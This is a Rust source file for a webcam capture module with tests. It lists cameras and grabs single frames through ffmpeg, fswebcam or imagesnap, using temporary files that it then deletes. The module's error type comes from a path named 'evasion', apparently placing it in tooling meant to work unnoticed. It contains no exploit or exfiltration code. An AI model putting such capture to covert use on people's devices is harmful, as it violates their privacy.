//! Webcam Capture Module
//!
//! Provides webcam/screenshot capture functionality:
//! - List available cameras
//! - Capture single frames
//! - Capture to file or memory
//! - Configurable resolution
//!
//! Platform support:
//! - Windows: Media Foundation / DirectShow
//! - Linux: V4L2 (Video4Linux2)
//! - macOS: AVFoundation
//!
//! Note: Full implementation requires platform-specific dependencies.
//! This module provides the API structure with basic implementations.

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

use crate::module::evasion::errors::EvasionError;

/// Camera information
#[derive(Debug, Clone)]
pub struct CameraInfo {
    /// Camera name/identifier
    pub name: String,
    /// Camera index
    pub index: u32,
    /// Whether camera is available
    pub available: bool,
    /// Supported resolutions (width x height)
    pub resolutions: Vec<(u32, u32)>,
}

/// Captured image data
#[derive(Debug, Clone)]
pub struct CapturedFrame {
    /// Raw image data (typically JPEG or raw RGB)
    pub data: Vec<u8>,
    /// Image width in pixels
    pub width: u32,
    /// Image height in pixels
    pub height: u32,
    /// Format of the image data
    pub format: ImageFormat,
    /// Timestamp when frame was captured
    pub timestamp: u64,
    /// Camera index that captured this frame
    pub camera_index: u32,
}

impl CapturedFrame {
    /// Save frame to file
    pub fn save<P: AsRef<Path>>(&self, path: P) -> Result<PathBuf, EvasionError> {
        let mut file = fs::File::create(&path).map_err(|e| {
            EvasionError::FileSystem(format!("Failed to create file: {}", e))
        })?;

        file.write_all(&self.data).map_err(|e| {
            EvasionError::FileSystem(format!("Failed to write file: {}", e))
        })?;

        Ok(path.as_ref().to_path_buf())
    }

    /// Get the file extension for this frame's format
    pub fn extension(&self) -> &'static str {
        self.format.extension()
    }
}

/// Image format
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ImageFormat {
    Jpeg,
    Png,
    RawRgb,
    RawBgr,
    Yuyv,
    Mjpeg,
}

impl ImageFormat {
    pub fn extension(&self) -> &'static str {
        match self {
            ImageFormat::Jpeg => "jpg",
            ImageFormat::Png => "png",
            ImageFormat::RawRgb => "raw",
            ImageFormat::RawBgr => "raw",
            ImageFormat::Yuyv => "raw",
            ImageFormat::Mjpeg => "jpg",
        }
    }
}

/// Webcam configuration
#[derive(Debug, Clone)]
pub struct WebcamConfig {
    /// Camera index (0 = default)
    pub camera_index: u32,
    /// Desired resolution (width, height)
    pub resolution: (u32, u32),
    /// Output format
    pub format: ImageFormat,
    /// JPEG quality (1-100)
    pub jpeg_quality: u8,
    /// Capture timeout in milliseconds
    pub timeout_ms: u64,
}

impl Default for WebcamConfig {
    fn default() -> Self {
        Self {
            camera_index: 0,
            resolution: (640, 480),
            format: ImageFormat::Jpeg,
            jpeg_quality: 85,
            timeout_ms: 5000,
        }
    }
}

/// Webcam capture module
pub struct WebcamModule {
    config: WebcamConfig,
}

impl WebcamModule {
    /// Create a new webcam module with default config
    pub fn new() -> Self {
        Self::with_config(WebcamConfig::default())
    }

    /// Create a new webcam module with custom config
    pub fn with_config(config: WebcamConfig) -> Self {
        Self { config }
    }

    /// List available cameras
    pub fn list_cameras() -> Vec<CameraInfo> {
        #[cfg(target_os = "windows")]
        {
            Self::list_cameras_windows()
        }

        #[cfg(target_os = "linux")]
        {
            Self::list_cameras_linux()
        }

        #[cfg(target_os = "macos")]
        {
            Self::list_cameras_macos()
        }

        #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
        {
            Vec::new()
        }
    }

    /// Capture a single frame from the default camera
    pub fn capture(&self) -> Result<CapturedFrame, EvasionError> {
        Self::capture_at(self.config.camera_index, self.config.resolution, self.config.format)
    }

    /// Capture a frame from a specific camera
    pub fn capture_camera(&self, index: u32) -> Result<CapturedFrame, EvasionError> {
        Self::capture_at(index, self.config.resolution, self.config.format)
    }

    /// Capture a frame with custom settings
    pub fn capture_with_settings(
        camera_index: u32,
        resolution: (u32, u32),
        format: ImageFormat,
    ) -> Result<CapturedFrame, EvasionError> {
        Self::capture_at(camera_index, resolution, format)
    }

    /// Internal capture implementation
    fn capture_at(
        camera_index: u32,
        resolution: (u32, u32),
        format: ImageFormat,
    ) -> Result<CapturedFrame, EvasionError> {
        #[cfg(target_os = "windows")]
        {
            Self::capture_windows(camera_index, resolution, format)
        }

        #[cfg(target_os = "linux")]
        {
            Self::capture_linux(camera_index, resolution, format)
        }

        #[cfg(target_os = "macos")]
        {
            Self::capture_macos(camera_index, resolution, format)
        }

        #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
        {
            Err(EvasionError::SystemInfo(
                "Webcam capture not supported on this platform".to_string(),
            ))
        }
    }

    // Platform-specific implementations

    #[cfg(target_os = "windows")]
    fn list_cameras_windows() -> Vec<CameraInfo> {
        // Windows: Would use Media Foundation or DirectShow to enumerate devices
        // For now, return a placeholder
        vec![CameraInfo {
            name: "Default Camera".to_string(),
            index: 0,
            available: true,
            resolutions: vec![(640, 480), (1280, 720), (1920, 1080)],
        }]
    }

    #[cfg(target_os = "windows")]
    fn capture_windows(
        camera_index: u32,
        resolution: (u32, u32),
        format: ImageFormat,
    ) -> Result<CapturedFrame, EvasionError> {
        // Windows: Would use Media Foundation CaptureEngine
        // This is a simplified implementation

        // For a real implementation, you would:
        // 1. Initialize Media Foundation
        // 2. Create CaptureEngine
        // 3. Select video source (camera)
        // 4. Configure format/resolution
        // 5. Capture frame

        Err(EvasionError::SystemInfo(
            "Windows webcam capture requires Media Foundation - not fully implemented".to_string(),
        ))
    }

    #[cfg(target_os = "linux")]
    fn list_cameras_linux() -> Vec<CameraInfo> {
        use std::fs;

        let mut cameras = Vec::new();

        // Check /dev/video* devices
        if let Ok(entries) = fs::read_dir("/dev") {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.starts_with("video") {
                    if let Some(index) = name.strip_prefix("video").and_then(|s| s.parse::<u32>().ok()) {
                        cameras.push(CameraInfo {
                            name: format!("/dev/video{}", index),
                            index,
                            available: true,
                            resolutions: vec![(640, 480), (1280, 720)],
                        });
                    }
                }
            }
        }

        cameras
    }

    #[cfg(target_os = "linux")]
    fn capture_linux(
        camera_index: u32,
        resolution: (u32, u32),
        format: ImageFormat,
    ) -> Result<CapturedFrame, EvasionError> {
        use std::process::Command;

        // Try using ffmpeg
        let device = format!("/dev/video{}", camera_index);
        let temp_path = format!("/tmp/hmm_webcam_{}.jpg", SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs());

        let output = Command::new("ffmpeg")
            .args([
                "-f", "v4l2",
                "-video_size", &format!("{}x{}", resolution.0, resolution.1),
                "-i", &device,
                "-frames:v", "1",
                "-y",
                &temp_path,
            ])
            .output();

        match output {
            Ok(result) => {
                if result.status.success() {
                    if let Ok(data) = fs::read(&temp_path) {
                        let _ = fs::remove_file(&temp_path);
                        return Ok(CapturedFrame {
                            data,
                            width: resolution.0,
                            height: resolution.1,
                            format: ImageFormat::Jpeg,
                            timestamp: SystemTime::now()
                                .duration_since(UNIX_EPOCH)
                                .unwrap_or_default()
                                .as_secs(),
                            camera_index,
                        });
                    }
                }
            }
            Err(_) => {}
        }

        // Try using fswebcam
        let output = Command::new("fswebcam")
            .args([
                "-d", &device,
                "-r", &format!("{}x{}", resolution.0, resolution.1),
                "--jpeg", "85",
                "--quiet",
                &temp_path,
            ])
            .output();

        match output {
            Ok(result) => {
                if result.status.success() {
                    if let Ok(data) = fs::read(&temp_path) {
                        let _ = fs::remove_file(&temp_path);
                        return Ok(CapturedFrame {
                            data,
                            width: resolution.0,
                            height: resolution.1,
                            format: ImageFormat::Jpeg,
                            timestamp: SystemTime::now()
                                .duration_since(UNIX_EPOCH)
                                .unwrap_or_default()
                                .as_secs(),
                            camera_index,
                        });
                    }
                }
            }
            Err(_) => {}
        }

        Err(EvasionError::SystemInfo(
            "No webcam tool available. Install ffmpeg or fswebcam.".to_string(),
        ))
    }

    #[cfg(target_os = "macos")]
    fn list_cameras_macos() -> Vec<CameraInfo> {
        // macOS: Would use AVFoundation to enumerate devices
        vec![CameraInfo {
            name: "FaceTime Camera".to_string(),
            index: 0,
            available: true,
            resolutions: vec![(640, 480), (1280, 720), (1920, 1080)],
        }]
    }

    #[cfg(target_os = "macos")]
    fn capture_macos(
        camera_index: u32,
        resolution: (u32, u32),
        format: ImageFormat,
    ) -> Result<CapturedFrame, EvasionError> {
        use std::process::Command;

        // Use imagesnap (needs to be installed: brew install imagesnap)
        let temp_path = format!("/tmp/hmm_webcam_{}.jpg", SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs());

        let output = Command::new("imagesnap")
            .args([
                "-w", "1",  // Wait 1 second for exposure
                "-q", "0.85",  // JPEG quality
                &temp_path,
            ])
            .output();

        match output {
            Ok(result) => {
                if result.status.success() {
                    if let Ok(data) = fs::read(&temp_path) {
                        let _ = fs::remove_file(&temp_path);
                        return Ok(CapturedFrame {
                            data,
                            width: resolution.0,
                            height: resolution.1,
                            format: ImageFormat::Jpeg,
                            timestamp: SystemTime::now()
                                .duration_since(UNIX_EPOCH)
                                .unwrap_or_default()
                                .as_secs(),
                            camera_index,
                        });
                    }
                }
            }
            Err(_) => {}
        }

        Err(EvasionError::SystemInfo(
            "imagesnap not available. Install with: brew install imagesnap".to_string(),
        ))
    }
}

impl Default for WebcamModule {
    fn default() -> Self {
        Self::new()
    }
}

/// Convenience function for quick webcam capture
pub fn capture_webcam<P: AsRef<Path>>(path: P) -> Result<PathBuf, EvasionError> {
    let frame = WebcamModule::new().capture()?;
    frame.save(path)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_webcam_module_creation() {
        let _webcam = WebcamModule::new();
        let _webcam_config = WebcamModule::with_config(WebcamConfig {
            camera_index: 1,
            resolution: (1280, 720),
            format: ImageFormat::Png,
            jpeg_quality: 90,
            timeout_ms: 10000,
        });
    }

    #[test]
    fn test_default_config() {
        let config = WebcamConfig::default();
        assert_eq!(config.camera_index, 0);
        assert_eq!(config.resolution, (640, 480));
        assert_eq!(config.format, ImageFormat::Jpeg);
        assert_eq!(config.jpeg_quality, 85);
        assert_eq!(config.timeout_ms, 5000);
    }

    #[test]
    fn test_image_format_extension() {
        assert_eq!(ImageFormat::Jpeg.extension(), "jpg");
        assert_eq!(ImageFormat::Png.extension(), "png");
        assert_eq!(ImageFormat::RawRgb.extension(), "raw");
        assert_eq!(ImageFormat::Mjpeg.extension(), "jpg");
    }

    #[test]
    fn test_camera_info() {
        let camera = CameraInfo {
            name: "Test Camera".to_string(),
            index: 0,
            available: true,
            resolutions: vec![(640, 480), (1280, 720)],
        };

        assert_eq!(camera.name, "Test Camera");
        assert_eq!(camera.index, 0);
        assert!(camera.available);
        assert_eq!(camera.resolutions.len(), 2);
    }

    #[test]
    fn test_list_cameras() {
        // This may return empty on headless systems
        let cameras = WebcamModule::list_cameras();
        // Just verify it doesn't panic
        let _ = cameras;
    }

    #[test]
    fn test_capture_api() {
        let webcam = WebcamModule::new();

        // Capture may fail on headless systems
        // Just verify the API works
        let _ = webcam.capture();
        let _ = webcam.capture_camera(0);
        let _ = WebcamModule::capture_with_settings(0, (640, 480), ImageFormat::Jpeg);
    }

    #[test]
    fn test_captured_frame() {
        let frame = CapturedFrame {
            data: vec![0xFF, 0xD8, 0xFF, 0xE0], // JPEG header
            width: 640,
            height: 480,
            format: ImageFormat::Jpeg,
            timestamp: 0,
            camera_index: 0,
        };

        assert_eq!(frame.width, 640);
        assert_eq!(frame.height, 480);
        assert_eq!(frame.format, ImageFormat::Jpeg);
        assert_eq!(frame.extension(), "jpg");
    }

    #[test]
    fn test_frame_save() {
        let frame = CapturedFrame {
            data: vec![0xFF, 0xD8, 0xFF, 0xE0, 0x00],
            width: 100,
            height: 100,
            format: ImageFormat::Jpeg,
            timestamp: 0,
            camera_index: 0,
        };

        let temp_path = std::env::temp_dir().join("test_frame.jpg");
        let result = frame.save(&temp_path);

        assert!(result.is_ok());
        assert!(temp_path.exists());

        // Cleanup
        let _ = fs::remove_file(&temp_path);
    }

    #[test]
    fn test_convenience_function() {
        let temp_path = std::env::temp_dir().join("test_webcam.jpg");
        let result = capture_webcam(&temp_path);

        // May fail on headless systems
        let _ = result;

        // Cleanup if created
        let _ = fs::remove_file(&temp_path);
    }
}
